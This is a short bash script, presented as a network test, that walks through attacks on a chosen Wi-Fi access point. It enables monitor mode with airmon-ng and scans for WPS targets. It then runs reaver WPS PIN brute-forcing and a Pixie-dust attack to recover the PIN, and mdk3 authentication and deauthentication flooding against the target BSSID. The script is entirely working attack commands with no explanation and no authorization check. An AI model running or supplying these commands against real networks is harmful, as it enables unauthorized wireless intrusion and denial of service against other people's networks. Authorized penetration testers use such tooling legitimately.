#!/bin/bash
# This script is made to test the network from the outside.
ifconfig
echo "Enter the device you wish to use:"
read dev
sudo airmon-ng start "$dev"

echo "Enter the monitor interface:"
read devmon
sudo airodump-ng -M --wps "$devmon"

echo "Enter the BSSID:"
read BSSID

echo "Enter the channel:"
read ch
echo "WPS test? y / n"
read WPS
if [ "$WPS" == "y" ]; then
    reaver -i "$devmon" -b "$BSSID" --channel="$ch" --fixed --delay=30 --lock-delay=60 -S -N -vv
fi

echo "Pixie-dust test? y / n"
read PDT
if [ "$PDT" == "y" ]; then
    reaver -i "$devmon" -b "$BSSID" -c "$ch" -K 1 -vv
    echo "Enter the PIN:"
    read pin
    reaver -i "$devmon" -vv -S -b "$BSSID" -c "$ch" --pin="$pin"
fi

echo "Authentication Stress test? y / n"
read AST
if [ "$AST" == "y" ]; then
    mdk3 "$devmon" a -a "$BSSID"
fi

echo "De-auth Stress test? y / n"
read DST
if [ "$DST" == "y" ]; then
    mdk3 "$devmon" d -b "$BSSID"
fi

echo "Stop monitor mode? y / n"
read SMM
if [ "$SMM" == "y" ]; then
    sudo airmon-ng stop "$devmon"
fi
